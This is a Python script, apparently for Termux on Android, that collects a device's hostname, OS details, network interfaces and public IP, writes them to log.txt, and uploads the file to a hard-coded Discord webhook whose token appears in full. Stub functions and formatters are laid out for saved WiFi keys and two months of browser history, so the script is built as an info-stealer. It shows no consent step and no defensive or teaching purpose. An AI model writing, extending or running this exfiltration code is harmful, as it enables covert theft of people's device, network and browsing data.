import subprocess
import requests
import platform
import socket
import os
import netifaces
from datetime import datetime, timedelta

# Discord Webhook URL
webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'

# Function to send message to Discord webhook with file attachment
def send_to_discord_with_file(file_path, message="Log file attached."):
    files = {'file': open(file_path, 'rb')}
    data = {'content': message}
    response = requests.post(webhook_url, files=files, data=data)
    if response.status_code == 204:
        print("File sent successfully to Discord webhook.")
    else:
        print(f"Failed to send file to Discord webhook. Status code: {response.status_code}")
        print(f"Response: {response.text}")

# Function to execute command and capture output
def execute_command(command):
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    return result.stdout.strip()

# Function to get device information
def get_device_info():
    device_info = {
        'Hostname': socket.gethostname(),
        'Platform': platform.system(),
        'Platform Release': platform.release(),
        'Platform Version': platform.version(),
        'Architecture': platform.machine(),
        'Python Version': platform.python_version(),
    }
    return device_info

# Function to get network interfaces and their details
def get_network_interfaces():
    interfaces = netifaces.interfaces()
    network_info = {}

    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        info = {}
        if netifaces.AF_INET in addrs:
            info['IPv4'] = addrs[netifaces.AF_INET]
        if netifaces.AF_INET6 in addrs:
            info['IPv6'] = addrs[netifaces.AF_INET6]
        network_info[iface] = info
    
    return network_info

# Function to get saved WiFi profiles for Termux (placeholder)
def get_saved_wifi_profiles_termux():
    # Placeholder for Termux, as direct access to WiFi profiles is not simple
    return []

# Function to collect all saved WiFi profiles
def get_saved_wifi_profiles():
    if platform.system() == 'Linux' and 'Android' in platform.release():  # Assuming Termux on Android
        return get_saved_wifi_profiles_termux()
    else:
        # Implement logic for other platforms if needed
        return []

# Function to get public IP address
def get_public_ip():
    ip = execute_command('curl -s https://api64.ipify.org')
    return ip

# Function to get browser history for Termux (placeholder)
def get_browser_history_termux():
    # Placeholder for Termux, as direct access to browser history databases is not simple
    return []

# Function to collect browser history
def get_browser_history():
    if platform.system() == 'Linux' and 'Android' in platform.release():  # Assuming Termux on Android
        return get_browser_history_termux()
    else:
        # Implement logic for other platforms if needed
        return []

# Function to collect all relevant information
def collect_information():
    device_info = get_device_info()
    network_interfaces = get_network_interfaces()
    saved_wifi_profiles = get_saved_wifi_profiles()
    public_ip = get_public_ip()
    browser_history = get_browser_history()  # Placeholder, adjust as per Termux capabilities
    return device_info, network_interfaces, saved_wifi_profiles, public_ip, browser_history

# Function to format device information as text
def format_device_info(device_info):
    info_text = "=== Device Information ===\n"
    for key, value in device_info.items():
        info_text += f"{key.capitalize()}: {value}\n"
    info_text += "\n"
    return info_text

# Function to format network interfaces as text
def format_network_interfaces(network_interfaces):
    interfaces_text = "=== Network Interfaces ===\n"
    for iface, info in network_interfaces.items():
        interfaces_text += f"Interface: {iface}\n"
        if 'IPv4' in info:
            for addr in info['IPv4']:
                interfaces_text += f"IPv4 Address: {addr['addr']}\n"
                interfaces_text += f"Netmask: {addr['netmask']}\n"
        if 'IPv6' in info:
            for addr in info['IPv6']:
                interfaces_text += f"IPv6 Address: {addr['addr']}\n"
                interfaces_text += f"Netmask: {addr.get('netmask', 'N/A')}\n"
        interfaces_text += "\n"
    return interfaces_text

# Function to format saved WiFi profiles as text
def format_saved_wifi_profiles(saved_wifi_profiles):
    wifi_text = "=== Saved WiFi Profiles ===\n"
    for profile in saved_wifi_profiles:
        wifi_text += f"SSID: {profile['SSID']}\n"
        if 'Security Key' in profile:
            wifi_text += f"Security Key: {profile['Security Key']}\n"
        if 'IP Address' in profile:
            wifi_text += f"IP Address: {profile['IP Address']}\n"
        wifi_text += "\n"
    return wifi_text

# Function to format browser history as text
def format_browser_history(browser_history):
    history_text = "=== Browser History (Last 2 Months) ===\n"
    for entry in browser_history:
        history_text += f"Title: {entry['title']}\n"
        history_text += f"URL: {entry['url']}\n"
        history_text += f"Timestamp: {entry['timestamp']}\n\n"
    return history_text

# Function to write collected information to log.txt
def write_to_log(file_path, device_info_text, network_interfaces_text, wifi_profiles_text, browser_history_text):
    with open(file_path, 'w') as f:
        f.write(device_info_text)
        f.write(network_interfaces_text)
        f.write(wifi_profiles_text)
        f.write(browser_history_text)

# Function to send log file to Discord webhook
def send_log_to_discord(log_file_path):
    with open(log_file_path, 'rb') as f:
        files = {'file': f}
        response = requests.post(webhook_url, files=files)
        if response.status_code == 204:
            print("File sent successfully to Discord webhook.")
        else:
            print(f"Failed to send file to Discord webhook. Status code: {response.status_code}")
            print(f"Response: {response.text}")

# Main function to orchestrate the process
def main():
    log_file_path = 'log.txt'
    device_info, network_interfaces, saved_wifi_profiles, public_ip, browser_history = collect_information()
    device_info_text = format_device_info(device_info)
    network_interfaces_text = format_network_interfaces(network_interfaces)
    wifi_profiles_text = format_saved_wifi_profiles(saved_wifi_profiles)
    browser_history_text = format_browser_history(browser_history)
    write_to_log(log_file_path, device_info_text, network_interfaces_text, wifi_profiles_text, browser_history_text)
    send_log_to_discord(log_file_path)

if __name__ == "__main__":
    main()
